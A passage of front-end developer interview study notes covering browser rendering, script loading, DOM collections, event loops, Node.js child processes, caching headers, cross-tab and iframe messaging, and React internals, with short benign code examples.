- **WeakMap**: Allows associating data with objects without preventing their garbage collection. This is useful for private data or caches that do not interfere with the lifecycle of the objects. Ideal for situations where you want to avoid creating memory leaks by inadvertently retaining references to objects.

- **WeakSet**: Enables tracking a group of objects for presence checks without affecting their garbage collection. This is useful for tracking which objects have undergone a specific process without creating memory leaks.

## Describe the Complete Process of Entering a URL to Presenting the Page

When a URL is entered into a browser, the process from initiating a web request to the final rendering of the page involves several critical steps. Here is a detailed breakdown:

### Web Request
1. **DNS Lookup**: The browser initiates a DNS query to convert the hostname in the URL into an IP address. This process may involve querying multiple DNS servers.
2. **TCP Connection**: Establishes a TCP connection with the server using a three-way handshake. This ensures a reliable communication channel.
3. **HTTP Request**: The browser sends an HTTP request to the server's IP address, requesting the webpage content.
4. **Server Response**: The server processes the request and sends back a response, typically including the HTML source code of the page.

### Parsing HTML
1. **Resource Fetching**: As the browser parses the HTML, it may encounter references to external resources such as JavaScript, CSS, images, and videos. Each of these resources may require additional DNS lookups, TCP connections, and HTTP requests.
2. **DOM and CSSOM Trees**: The browser converts the HTML document into a structured format known as the Document Object Model (DOM). Simultaneously, CSS files are processed into the CSS Object Model (CSSOM) or style tree.
3. **Render Tree Construction**: The DOM and CSSOM trees are combined to form the render tree, which represents all visible elements on the page and their styles.
4. **Optimization**: To optimize loading and parsing:
   - CSS is typically placed in the `<head>` to avoid rendering blocks.
   - JavaScript files are placed at the end of the `<body>` or loaded with `defer` or `async` attributes to not block HTML parsing.
   - Specifying image dimensions helps in layout calculation and prevents reflows.

### Rendering the Page
1. **Layout Calculation**: The browser calculates the size and position of each element in the render tree.
2. **Painting**: The visible elements are then painted onto the screen.
3. **JavaScript Execution**: JavaScript files are executed, which may modify the DOM and trigger a re-rendering of the page.
4. **Asynchronous Loading**: Some resources, like CSS and images, are fetched asynchronously and may cause the page to render again upon loading.

### Repaint vs. Reflow

Understanding the difference between repaint and reflow is crucial in web development, especially for dynamic web pages where elements can change frequently due to animations, modals, dialogs, popups, or modifications to the DOM like adding or deleting elements.

#### Repaint
A repaint occurs when changes are made to an element's visual appearance that do not affect its layout in the document. Examples include changes in color, background-color, visibility, and outline. During a repaint, the element's geometry (size and position) remains unchanged, and thus, it does not impact the position of any other elements.

#### Reflow
Reflow, also known as layout, involves recalculating the positions and sizes of elements in the document. This process is more computationally expensive than repaints because it affects the layout of the element that is changing and may also impact other elements on the page. Causes of reflow include changes to the browser window size, alterations in content (such as adding or removing elements), and modifications to elements' styles affecting their sizes (e.g., width, height, margin, padding).

#### Difference
The primary difference between repaint and reflow is the scope of impact and the cost in terms of performance. Reflows can trigger repaints, but repaints do not necessarily cause reflows. Because reflows can impact the layout of the entire page, they are more performance-intensive than repaints.

#### Methods to Avoid Unnecessary Reflows
- **Batch Style Changes**: Apply multiple style changes at once by changing the class of an element instead of individual styles.
- **Minimize DOM Access**: Modify elements offscreen or in a document fragment before adding them to the DOM. Using `display: none` before making changes can remove the element from the flow, thus reducing reflow costs.
- **Use Block Formatting Context (BFC)**: Utilizing BFC properties can isolate elements from affecting each other, minimizing the need for reflows.
- **Event Optimization**: Use debouncing and throttling for events that trigger frequent reflows, such as window resizing or scrolling.
- **Optimize Animations**: Prefer CSS3 animations and `requestAnimationFrame` over JavaScript animations to reduce reflow and repaint costs.

### Expansion: Block Formatting Context (BFC)
A Block Formatting Context is an HTML box that serves as a containment boundary, ensuring that elements within it do not affect the layout of elements outside it. BFC can be triggered by:
- The root element (`html`).
- Elements with `float` properties other than `none`.
- Elements with `position: absolute` or `fixed`.
- Elements with `display: inline-block`, `table-cell`, `table-caption`, `flex`, `grid`, or other table-related values.
- Elements with `overflow` set to anything other than `visible`.

## What is the difference between `defer` and `async` attributes in `<script>` elements?

The `<script>` element can be used to include JavaScript in HTML documents. When scripts are loaded and executed, they can affect how quickly a page becomes interactive. The `defer` and `async` attributes provide different ways to control this behavior.

### `defer` for Deferred Execution
The `defer` attribute tells the browser to continue parsing the HTML document while the script is being downloaded asynchronously. The key point is that the script execution is deferred until the entire HTML document has been parsed. This means that scripts with `defer` will not run until the HTML parsing is complete, which is similar to placing a `<script>` tag at the end of the `<body>` element. However, `defer` ensures that scripts are executed in the order they appear in the document, which is not guaranteed when scripts are manually placed at the bottom of the `<body>`. 

### `async` for Asynchronous Execution
The `async` attribute also allows the script to be downloaded in parallel to HTML parsing. However, unlike `defer`, `async` scripts are executed as soon as they are downloaded, which could be before or after the HTML parsing is complete. This means the execution order of scripts is not guaranteed. `async` is best used for scripts that do not depend on other scripts and do not modify the DOM (Document Object Model).

### If Neither `defer` nor `async` is Provided
If neither `defer` nor `async` is provided, the script is fetched and executed immediately, blocking the HTML parsing until the script is downloaded and executed. This can lead to slower page load times, especially for large scripts.

## Difference between HTMLCollection and NodeList

HTML and the Document Object Model (DOM) are essential components of web development. Understanding different parts of the DOM, such as `HTMLCollection` and `NodeList`, is crucial for manipulating web pages effectively.

- **HTMLCollection**: This is a live collection of HTML elements. It updates automatically when the DOM changes. `HTMLCollection` exclusively contains `Element` nodes, typically returned by methods like `document.getElementsByClassName` and the `.children` property of an element.

- **NodeList**: A more general collection that can include different types of nodes, not just elements. This can be live or static, depending on how it's obtained. For example, `NodeList` returned by `Node.childNodes` is live, but the one returned by `document.querySelectorAll` is static.

### Difference between HTMLCollection and NodeList

1. **Node Types**: `HTMLCollection` is limited to `Element` nodes, while `NodeList` can include any node types, such as `Element`, `Text`, and `Comment`.

2. **Dynamism**: `HTMLCollection` is always live, meaning it reflects DOM changes immediately. `NodeList` can be either live or static. Live `NodeList`s reflect DOM changes, whereas static ones do not.

### `.children` vs `.childNodes`

Considering the following HTML snippet:

```html
<p id='p1'>
    <em>hello</em> hello <b>bold</b><!-- comment -->
</p>
```

- `p.children` refers to an `HTMLCollection` containing only element nodes within `p` (`<em>` and `<b>` in this case). It does not include text nodes or comments.

- `p.childNodes` refers to a `NodeList` and includes all node types - `Element`, `Text`, and `Comment`. It will contain `<em>`, text nodes (including the 'hello' text), `<b>`, and the comment node.

- `p.tagName` and `p.nodeName` are properties used to get the tag name of an element. `p.tagName` is used specifically for elements and returns the tag name in uppercase, while `p.nodeName` is applicable to all types of nodes and returns the name of the node (the tag name for elements in uppercase).

In summary, `HTMLCollection` and `NodeList` are key concepts in DOM manipulation, each with its specific use cases. Understanding their differences is vital for efficient and effective front-end web development.

## Difference Between Browser and Node.js Event Loop:

JavaScript, known for its single-threaded nature, employs the event loop mechanism to manage asynchronous operations, facilitating non-blocking execution. This approach is pivotal in both browser and Node.js environments. However, the event loop's implementation and functionality exhibit distinct characteristics in each context, shaped by their unique operational demands.

### Micro-tasks and Macro-tasks:
- **Macro-tasks**: Encompass operations like `setTimeout`, `setInterval`, and various web API calls. They are scheduled to execute once the current script finishes and the micro-task queue is cleared.
- **Micro-tasks**: Primarily involve promise-related operations, including async/await. These tasks execute immediately after the current script, before any pending macro-tasks, granting them a higher execution priority.

### Browser Event Loop:
- In the browser, the event loop shares the main thread with activities such as DOM rendering, necessitating efficient task management to avoid UI disruptions.
- The browser event loop manages two kinds of task queues: macro-tasks and micro-tasks. Micro-tasks are given precedence, executing right after the current task, even before proceeding to the next macro-task. This prioritization ensures prompt handling of operations like promise resolutions, often before rendering the next frame.

### Node.js Event Loop:
- Node.js, while also single-threaded and dependent on asynchronous execution, classifies macro-tasks and micro-tasks into specific types and priorities. This reflects its backend-oriented nature, focusing on efficient I/O operations rather than UI concerns.
- **Macro-task types in Node.js**, listed in order of priority:
  - **Timers**: Includes `setTimeout` and `setInterval` for scheduling future tasks.
  - **I/O Callbacks**: Addresses network, stream, and TCP errors.
  - **Idle/Prepare**: Consists of internal Node.js engine tasks.
  - **Poll**: Responsible for fetching new I/O events.
  - **Check**: Manages `setImmediate` callbacks.
  - **Close Callbacks**: Executes callbacks such as `socket.on('close')`.

- **Micro-task types in Node.js**:
  - **`process.nextTick`**: This function defers the execution of a callback until the current operation concludes, offering very high priority.
  - **Promise/async/await**: Handles asynchronous operations using promises.

- In Node.js, the event loop initially executes synchronous code, then processes all micro-tasks (with `process.nextTick` having utmost priority), followed by macro-tasks. It also attends to micro-tasks as they emerge during macro-task execution.

The event loop in both browser and Node.js is fundamentally similar, enabling asynchronous JavaScript execution within a single-threaded context. However, their implementations diverge significantly. In Node.js, macro-tasks and micro-tasks are distinctly categorized with defined priorities, mirroring its backend emphasis on effective I/O management. Both environments prioritize synchronous tasks first, then micro-tasks, and finally macro-tasks. The browser's event loop, specifically designed to maintain UI responsiveness, prioritizes micro-tasks to ensure smooth user experiences. Conversely, Node.js's event loop structure is tailored for efficient I/O processing.



## Node.js Process Creation and Communication

### Process vs Thread
- **Process**: A process is the minimum unit for an Operating System (OS) to allocate resources and scheduling. It operates within its own independent memory space, ensuring that processes do not interfere with each other's operations.
- **Thread**: A thread is the smallest unit of processing within a process. It shares the memory space of its parent process, allowing for efficient execution of concurrent operations within the same application. JavaScript, while operating on a single-threaded model, supports multithreading through mechanisms like Web Workers for web applications.

### Why Use Multiprocessing in JavaScript?
- **Utilization of Multi-core CPUs**: It allows applications to leverage multi-core CPU architectures, significantly improving computation speed and application responsiveness.
- **Memory Limitations**: Each Node.js process has a memory limit. Multiprocessing enables an application to surpass the memory limitations of a single process, utilizing more memory collectively across multiple processes.
- **Efficiency and Performance**: Multiprocessing can lead to better resource utilization, enhanced performance, and reduced execution times by distributing workload across multiple CPU cores.
- **Application Methods**: In the context of web applications, `WebWorker` is utilized for multiprocessing to offload tasks from the main thread. For server-side applications using Node.js, multiprocessing is achieved through the `fork` or `cluster` modules, facilitating concurrent execution of tasks and improved application scalability.

### Fork in Node.js
The `fork` method is a part of the `child_process` module in Node.js, designed to create child processes. Here is a example illustrating how to use `fork`:

```javascript
// Main process (e.g., server.js)
const http = require('http');
const { fork } = require('child_process');

const server = http.createServer((req, res) => {
    if (req.url === '/compute') {
        const computeProcess = fork('./compute.js');
        computeProcess.send('Start');

        computeProcess.on('message', (result) => {
            res.end(`Result: ${result}`);
        });

        computeProcess.on('exit', () => console.log('Computation process exited'));
    } else {
        res.end('Server is running');
    }
});

server.listen(3000, () => console.log('Server listening on port 3000'));

// Child process (e.g., compute.js)
process.on('message', (msg) => {
    if (msg === 'Start') {
        let sum = 0;
        for (let i = 0; i < 10000; i++) sum += i;
        process.send(sum);
        process.exit(0);
    }
});
```

### Cluster in Node.js
The `cluster` module in Node.js enables the creation of child processes that share server ports, facilitating load balancing across multiple CPU cores. Below is a example of using `cluster`:

```javascript
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
    console.log(`Master process is running with PID: ${process.pid}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });
} else {
    http.createServer((req, res) => {
        res.writeHead(200);
        res.end('Hello from Node.js!');
    }).listen(8000);

    console.log(`Worker started with PID: ${process.pid}`);
}
```

**Best Practices**:
- **PM2 for Process Management**: In production, consider using PM2 or similar tools for advanced process management and load balancing. These tools offer more sophisticated monitoring, logging, and clustering features.
- **Fork vs. Cluster Usage**:
  - **Fork**: Best suited for offloading CPU-intensive tasks to child processes, thereby preventing the main application thread from blocking.
  - **Cluster**: Ideal for creating redundant worker processes in server applications, enhancing availability and fault tolerance, especially under high load.

## Describe JS-bridge principles

### What is JS-bridge
JSBridge serves as a middleware between native applications and JavaScript running within a webview. JavaScript cannot directly invoke native APIs due to the sandboxed nature of web content for security reasons. A JSBridge provides a structured interface through which JavaScript can communicate with the native side of an application. This enables web content to access device features or native functionality that is otherwise inaccessible to pure web applications. For example, within the Facebook app, it's possible to open H5 websites; this is facilitated by JSBridge, allowing the web content to interact with the app's native features.

### Frequent used methods to achieve JS-Bridge

1. **Global API Registration**: This method involves exposing native functions as global JavaScript functions that can be called directly from the web content. However, this approach may encounter issues with asynchronous execution, such as delays in reading from local files or fetching data over the network. For example:

```js
// Incorrect: const version = window.getVersion() // getVersion is from bridge, but have problem of lag at async, e.g. read from local file or web
async function getVersion() {
  return new Promise((resolve, reject) => {
    if (window.bridge && window.bridge.getVersion) {
      resolve(window.bridge.getVersion());
    } else {
      reject('Bridge or getVersion method not found.');
    }
  });
}
```

2. **URL Scheme (Recommended)**: This technique involves defining custom URL schemes that the native application can recognize and handle. When a webview navigates to a URL with a custom scheme, the app intercepts the request and performs the corresponding native action. This method is more flexible and allows for easy asynchronous communication. A common implementation involves creating invisible iframes to trigger these URL schemes without navigating away from the current page. The example provided showcases an SDK object encapsulating calls to different native functions via URL schemes:

```js
// Example of an SDK object to interface with native app functions through URL schemes
const sdk = {
    invoke(url, data, onSuccess, onError) {
        const iframe = document.createElement('iframe');
        iframe.style.visibility = 'hidden';
        document.body.appendChild(iframe);
        iframe.onload = () => {
            try {
                const content = iframe.contentWindow.document.body.innerHTML;
                onSuccess(JSON.parse(content));
            } catch (error) {
                onError(error);
            } finally {
                iframe.remove();
            }
        };
        iframe.onerror = (error) => {
            onError(error);
            iframe.remove();
        };
        iframe.src = `my-app-name://${url}?data=${encodeURIComponent(JSON.stringify(data))}`;
    },
    fn1(data, onSuccess, onError) {
        this.invoke('api/fn1', data, onSuccess, onError);
    },
    fn2(data, onSuccess, onError) {
        this.invoke('api/fn2', data, onSuccess, onError);
    },
    fn3(data, onSuccess, onError) {
        this.invoke('api/fn3', data, onSuccess, onError);
    }
};
```

## Storing Resources for Quick Rendering in Future Requests
Caching strategies enable browsers to store copies of files locally, reducing load times for repeat visitors and decreasing server load.

### HTTP Headers for Caching
HTTP headers control the caching mechanisms of web resources. Here are the main headers involved:

**Cache-Control**  
The `Cache-Control` header specifies directives for caching mechanisms in both requests and responses. It's critical for defining the duration and manner of caching. Examples include:
- `max-age=<seconds>`: Specifies the maximum amount of time a resource is considered fresh.
- `no-cache`: Requires caches to submit the request to the origin server for validation before releasing a cached copy.
- `private`: Indicates that the response is intended for a single user and should not be stored by shared caches.

**Expires**  
The `Expires` header provides a specific date/time after which the response is considered stale. It is less flexible than `Cache-Control` and is overridden if both headers are present.

**ETag**  
An `ETag` (entity tag) is a unique identifier assigned by a web server to a specific version of a resource. It helps to manage changes to resource files, enabling more efficient caching by allowing web servers to validate if the content has changed since the last fetch.

**Last-Modified**  
The `Last-Modified` header indicates the date and time a resource was last changed. Like `ETag`, this header helps in validating cached resources. If the resource has not been modified since the last fetch, a `304 Not Modified` response can be returned instead of the resource, saving bandwidth.

### Practical Example: Implementing Caching with HTTP Headers
To illustrate the use of these headers in practice, consider the following scenario:
You have a website with a JavaScript file that rarely changes. To ensure that users don't download this file every time they visit your site, you can set HTTP headers as follows:

```http
Cache-Control: public, max-age=31536000
ETag: "abcd1234"
```

In this example:
- `Cache-Control` instructs the browser that the file can be cached and considered fresh for one year (31,536,000 seconds).
- The `ETag` header provides a unique version identifier, allowing the browser to check if the file has changed since the last download.

Using these headers correctly can significantly enhance user experience by speeding up load times and reducing server load.

## How are Hybrid Templates Updated?
### Template Management and Version Control
Effective template management is achieved through systematic version control and careful organization:

1. **CMS Upload:** Templates are uploaded to a template server via a content management system (CMS), ensuring that all digital assets are centrally managed.
2. **Version Tagging:** Each template upload is tagged with a unique version identifier (e.g., v1.0, v1.1). This practice supports effective iteration management, facilitates easy rollback in case of issues, and simplifies version comparisons.

### Template Integration in Applications
Templates are integrated into applications through a series of steps that ensure their proper utilization and rendering:

1. **Template Retrieval:** Applications fetch the latest template versions from the server as needed, downloading essential files including HTML, JavaScript (JS), and Cascading Style Sheets (CSS).
2. **Webview Rendering:** The application's view layer utilizes a webview to render the downloaded content. Files are accessed through a URL scheme (e.g., `file://`), allowing for isolated and secure rendering within the app.
3. **Dynamic Data Rendering:** Webviews make AJAX calls to an API server to retrieve necessary data. This data is then dynamically populated into the HTML templates, creating a personalized user experience.

### Template Update Triggers
The timing of template updates is crucial to maintain both performance and user experience:

- **At Launch:** Each time the application is launched, it checks for and downloads any available new templates.
- **Periodic Updates:** Regular checks (e.g., every 5 minutes) are scheduled to ensure the application has the most current template, balancing the need for freshness with performance considerations.

### Managing Template Updates
The update process is designed to minimize disruption and maximize application performance:

1. **Performance Considerations:** Direct downloads of new templates at the time of detection can adversely affect the app’s responsiveness, particularly under poor network conditions.
2. **Background Processing:** To avoid performance hits, new templates are downloaded in the background, allowing the application to continue operating with the current version until the update is ready.
3. **Seamless Switch:** Upon successful download, the application seamlessly transitions to the new template version without interrupting the user experience, ensuring a smooth and imperceptible update process.

## How to Implement Multi-Tab Communication on a Website?

Implementing multi-tab communication in web applications allows for the sharing of data and messages between different tabs or windows of the same origin. Here are three common methods to achieve this, along with their advantages, limitations, and use cases.

### 1. Using WebSockets
WebSockets provide a full-duplex communication channel over a single, long-lived connection, enabling real-time data exchange between the client and server.

- **Advantages**:
  - No CORS (Cross-Origin Resource Sharing) limitations, allowing for communication across different domains.
  - Enables real-time, bidirectional communication between the client and server.

- **Limitations**:
  - Requires server-side support, which can be more costly and complex to implement compared to client-side-only solutions.
  - Maintaining a WebSocket connection can be resource-intensive for both the server and client.

- **Use Case**:
  Ideal for applications that require real-time data exchange, such as live chat applications, online gaming, and collaborative editing tools.

### 2. Using `localStorage`
`localStorage` is a web storage API that allows data to be stored in key-value pairs in the browser, and it can be used for communication between tabs within the same origin.

- **Advantages**:
  - Simple to implement and does not require server-side support.
  - Works across tabs within the same origin, making it suitable for sharing data between different parts of the same application.

- **Limitations**:
  - Limited to communication within the same origin.
  - Storage space is limited (typically around 5MB).

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list page) -->
  <script>
      window.addEventListener('storage', event => {
          if (event.key === 'changeInfo') {
              console.info('New info received:', event.newValue);
          }
      });
  </script>
  <!-- In another tab (e.g., detail page) -->
  <script>
      document.getElementById('btn1').addEventListener('click', () => {
          const newInfo = {
              id: 100,
              name: 'Item ' + Date.now()
          };
          localStorage.setItem('changeInfo', JSON.stringify(newInfo));
      });
  </script>
  ```
  - **Key Points**:
    - Tabs A and B are within the same origin.
    - Tab A sets `localStorage`, and Tab B listens for changes in `localStorage`.

### 3. Using `SharedWorker`
`SharedWorker` is a type of Web Worker that allows for the creation of a shared execution environment, accessible by multiple scripts even if they are in different windows, iframes, or tabs.

- **Advantages**:
  - Enables communication and data sharing between tabs, iframes, or windows from the same origin.
  - Offloads work to a background thread, preventing UI blocking.

- **Limitations**:
  - More complex to implement and test compared to other methods.
  - Support across browsers can be inconsistent.
  - Limited to same-origin communication.

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list) -->
  <script>
      const worker = new SharedWorker('worker.js');
      worker.port.onmessage = e => console.info('Message from worker:', e.data);
  </script>
  <!-- In another tab (e.g., detail) -->
  <script>
      const worker = new SharedWorker('worker.js');
      document.getElementById('btn1').addEventListener('click', () => {
          worker.port.postMessage('Message from detail tab');
      });
  </script>
  ```
  ```js
  // worker.js
  const ports = new Set();
  onconnect = event => {
      const port = event.ports[0];
      ports.add(port);
      port.onmessage = e => {
          // Broadcast the message to all connected ports except the sender
          ports.forEach(p => {
              if (p !== port) {
                  p.postMessage(e.data);
              }
          });
      };
      port.postMessage('SharedWorker initialized');
  }
  ```
  - **Key Points**:
    - `SharedWorker` can start a shared process for communication between tabs from the same origin.
    - It is capable of running JavaScript in the background, independent of any particular tab, allowing for more complex inter-tab communication scenarios.

### How to Achieve Communication Between a Website and an Iframe

Communicating between a website and an iframe can be efficiently achieved using the `window.postMessage()` method. This approach allows for secure cross-origin communication without being restricted by CORS (Cross-Origin Resource Sharing) policies. The `postMessage` method enables sending data from the parent page to an iframe or vice versa, regardless of their origin, ensuring a versatile and secure way to interact across different domains.

- **Advantages**:
  - Bypasses CORS restrictions, enabling communication across different origins.
  - Provides a mechanism to verify the origin of the messages, enhancing security.

- **Example Code**:

  - **Child (Iframe Content)**:
    ```html
    <!-- Child HTML content -->
    <p>Child page
      <button id="btn1">Send Message</button>
    </p>
    <script>
        const btn1 = document.getElementById('btn1');
        btn1.addEventListener('click', () => {
            console.info('Child button clicked');
            window.parent.postMessage('Message from child', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always check the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Child received:', event.data);
            }
        });
    </script>
    ```
  - **Parent**:
    ```html
    <!-- Parent HTML content -->
    <p>Index page
      <button id="btn1">Send Message</button>
    </p>
    <iframe id="iframe1" src="./child.html"></iframe>
    <script>
        const btn1 = document.getElementById('btn1');
        const iframe = document.getElementById('iframe1');

        btn1.addEventListener('click', () => {
            console.info('Parent button clicked');
            iframe.contentWindow.postMessage('Message from parent', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always validate the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Parent received:', event.data);
            }
        });
    </script>
    ```
- **Key Points**:
  - The `'*'` argument in `postMessage` indicates that the message can be sent to any origin. In production environments, this should be replaced with the specific target origin to prevent security vulnerabilities.
  - It's crucial to validate the `event.origin` in the message event listener to ensure that messages are only accepted from trusted sources. This validation prevents potential cross-site scripting (XSS) attacks.

## Handling Rendering of 100,000 Data Entries

It's essential to first communicate to the interviewer that returning 100,000 data entries in one go is technically impractical. A preferable approach would be to use **pagination** to limit the amount of data sent and rendered at any one time.

Before seeking solutions, assess whether the browser can handle processing 100,000 data entries. While handling such data as strings or simple data structures in JavaScript might be feasible, rendering them directly to the DOM would result in significant performance issues, including sluggishness and potential crashes.

### 1. **Custom Middleware Layer**:
Implement a custom Node.js middleware layer that fetches and processes the 100,000 data entries. The front-end application would then interact with this middleware instead of directly connecting to the backend server.

While this approach can help manage the data more efficiently by pre-processing it before rendering, it is costlier in terms of development time and resources.

### 2. **Virtual Scrolling (Virtual List)**:
Implement virtual scrolling to render only the DOM elements in the viewport. Elements outside the viewport are not rendered but are accounted for in terms of spacing to ensure smooth scrolling. As the user scrolls, elements enter the viewport are rendered, and those leaving the viewport are destroyed or reused.

Implementing virtual scrolling improves application performance significantly by reducing the number of DOM elements that need to be managed at any given time, thereby minimizing browser workload and memory usage.

This method is technically challenging to implement from scratch due to the need to manage the creation and destruction of DOM elements dynamically based on the scroll position. It is highly recommended to use third-party libraries that provide virtual scrolling capabilities.

For Vue.js projects, `Vue-virtual-scroll-list` can be used, and for React projects, `React-virtualized` is a suitable choice. These libraries simplify the implementation of virtual scrolling by handling the complexities of DOM element management based on scroll behavior.

However, even using these libraries, the performance is still a concern for phones and low-end devices. It's important to consider the user experience and the practicality of displaying such a large amount of data at once.



## How to Prevent 300ms Delay for Double Click to Zoom on Mobile Phones?
On mobile web applications, a common issue is the 300ms delay when users attempt to double-click (tap) to zoom. This delay was originally implemented to differentiate between a tap (single click) and a double-tap (double click). However, this can interfere with the responsiveness of web applications. In the past, developers used libraries like FastClick to circumvent this delay. Modern browsers have introduced ways to address this issue by detecting the site's responsiveness through meta tags.

To prevent the 300ms delay on mobile devices without relying on external libraries like FastClick, ensure your web application is using responsive design principles. Implement the following meta tag in your HTML:
```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```
This meta tag informs the browser that your website is optimized for mobile devices, prompting it to disable the 300ms delay for a better user experience. This approach is preferred as it relies on standard responsive design practices rather than additional scripts, improving your website's performance and compatibility.

# 6. VDOM and React.md

## Is Virtual DOM (VDOM) fast?

The Virtual DOM (VDOM) is a core concept in modern web development, particularly in frameworks like React and Vue. It's a lightweight representation of the actual DOM (Document Object Model) in the form of JavaScript objects. While the Virtual DOM was popularized by React, it's now widely used across different front-end frameworks due to its advantages in updating user interfaces.

### Understanding Virtual DOM and Its Performance

The speed of the Virtual DOM depends on the context of comparison. When comparing the direct manipulation of the real DOM (as in libraries like jQuery) to the Virtual DOM approach, direct DOM manipulation can be quicker for simple, isolated operations. This is because it involves a direct interaction with the browser's rendering pipeline. However, this approach can become inefficient and less scalable in complex applications.

The Virtual DOM provides an abstraction layer that allows for a more declarative way of defining UI components and their state changes. Here's how it works:
1. Upon data changes in the application, the UI is re-rendered in the Virtual DOM.
2. A diffing algorithm compares this new Virtual DOM with the previous snapshot to identify the minimal set of changes needed for the real DOM.
3. These changes are batched and applied to the real DOM efficiently, reducing direct manipulation and reflow/repaint costs.

### Advantages of Using Virtual DOM

- **Component-Based Architecture**: React and Vue use a component-based structure, encapsulating UI and business logic into reusable components, which enhances development scalability and manageability.
- **Separation of Concerns**: These frameworks separate the data model from the UI (view), leading to a more predictable data flow and easier state management.
- **Efficiency in Development**: Developers can concentrate on state management and business logic rather than direct DOM manipulations, resulting in more maintainable code and quicker development cycles.

In conclusion, the Virtual DOM is not inherently faster than direct DOM manipulation for every operation. However, it provides a more efficient and effective approach for dynamic web applications, particularly those with complex interfaces and frequent state changes. Its efficiency stems from reducing the amount of direct DOM manipulation, leading to improved performance in applications where state changes are common.

## What is `window.requestIdleCallback`? What's the difference between `requestIdleCallback` and `requestAnimationFrame`?

`window.requestIdleCallback` is a method that allows developers to queue a function to be executed when the browser is idle. This API provides an opportunity to perform background and low-priority work without interfering with critical animations or input response times. It's particularly useful for tasks that aren't time-critical, such as analytics and background data processing.

### React Fiber

React Fiber is a reimplementation of React's core algorithm. It changes the component tree structure to a linked list, enabling incremental rendering. This means that rendering work can be split into chunks and spread out over multiple frames. Fiber's architecture allows React to pause rendering to handle more urgent tasks and then resume when the browser is idle. This is where `requestIdleCallback` becomes relevant; it provides a native way to schedule these low-priority tasks during idle times, enhancing performance without sacrificing user experience.

However, it's important to note that `requestIdleCallback` may have compatibility issues with Safari and Internet Explorer.

### Difference between `requestIdleCallback` and `requestAnimationFrame`

- **`requestAnimationFrame`** is designed for animations and executes just before each repaint, ensuring smooth visual updates. It has a higher priority because maintaining a high frame rate is crucial for animations and user interface responsiveness.
- **`requestIdleCallback`**, on the other hand, is intended for tasks that can wait until the main thread is idle. It runs with lower priority, making it suitable for non-urgent tasks that don't need to be completed immediately.

Both `requestAnimationFrame` and `requestIdleCallback` are considered macro tasks in the JavaScript event loop, but they serve different purposes based on their execution timing and priority levels.

## Difference Algorithm and Implementation in React

### Difference Algorithm
The difference algorithm, often referred to as the "diff" algorithm, plays a crucial role in determining how to update the DOM by comparing two versions of the virtual DOM. Here’s how it works:
- The algorithm compares components at the same hierarchical level in the virtual DOM tree, avoiding cross-level comparisons.
- If it detects different tags, it will remove the old component and construct a new one instead of delving into further details.
- For child components, the comparison is facilitated by unique "keys," which underscore the significance of assigning keys to list items.

### React's Difference Algorithm
React's diff algorithm employs an efficient strategy known as "right shifting." This means that during a comparison, if elements have only moved backward (to the right) in the list, React will move the elements accordingly instead of recreating them. This approach minimizes unnecessary DOM manipulations, leading to better performance.

### Importance of Keys
Keys are vital for optimizing the rendering process in React. When keys are provided, React uses them to identify which elements have changed, been added, or been removed. This helps in:
- Precisely moving elements in the DOM without having to rebuild them, thus saving time and computational resources.
- Increasing efficiency, especially in dynamic lists where the order of elements might change over time. Without keys, React would have to rebuild the entire list to ensure accuracy, which is far less efficient.

## Common Pitfalls Encountered When Using React

### Naming Conventions for Custom Components
- Custom component names must start with an uppercase letter to differentiate them from native HTML tags. For example, `<Input/>` is a custom component, while `<input/>` refers to the standard HTML input element.

### Wrapping Variables with Braces Inside JSX
- Variables inside JSX should be wrapped in curly braces `{}`. For instance, `<Input value={value} />` correctly binds the `value` variable to the `Input` component's `value` property.

### Asynchronous `setState`
- The `setState` function updates the component state asynchronously. This means you should not expect the state to reflect the new value immediately after calling `setState`. For synchronous logic post-state update, use `setState`'s callback function.

## Unified Error Handling in React
- The `ErrorBoundary` component is used to catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed.
- It only catches errors in the rendering phase, meaning it does not catch errors in event handlers or asynchronous code.
- It works in production environments, but in development, React still displays errors in the UI for better debugging experience.

```typescript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error) {
    // Update state to render fallback UI on next render
    console.info('getDerivedStateFromError', error);
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    // Log the error for further analysis
    console.error('componentDidCatch', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      // Display fallback UI
      return <h1>Something went wrong.</h1>;
    }
    // Render children components if no error
    return this.props.children; 
  }
}
```

### Handling Errors Outside of ErrorBoundary

#### Event Errors
- `ErrorBoundary` does not catch errors from DOM events such as `onClick`. You can use `window.onerror` for global error handling or `try...catch` blocks within event handlers.

#### Asynchronous Errors
- `ErrorBoundary` does not catch errors in asynchronous operations like `setTimeout`. Similar to event errors, use `window.onerror` or specific error handling logic in your asynchronous code.

#### Extension: Unhandled Promise Rejections
- Use the `window.onunhandledrejection` event to listen for unhandled promise rejections, providing an opportunity to handle these and prevent the application from crashing.

### Error Reporting and Monitoring
- Implementing error reporting and monitoring (also known as error tracking or logging) is crucial for understanding and improving the stability of a React application. This involves capturing errors, logging them to a server, and analyzing them to fix bugs or improve application UX.

## React Lifecycle

The React component lifecycle refers to the series of events that occur from the moment a component is initially rendered until it is finally destroyed. Understanding these lifecycle events is crucial for creating efficient and effective React applications. The lifecycle can be divided into three main phases:

### Mounting
Mounting is the phase in which a React component is being inserted into the DOM (Document Object Model). It encompasses the following lifecycle methods:
- `constructor()`: This method is called before anything else, when the component is initiated. It's commonly used to initialize state or bind event handlers.
- `static getDerivedStateFromProps()`: This method is called right before rendering the component in both the mounting and the updating phase. It's used to update the state based on changes in props over time.
- `render()`: The render method is the only required method in a class component. It examines `this.props` and `this.state` and returns one of the following types: React elements, Arrays and fragments, Portals, String and numbers, Booleans or null.
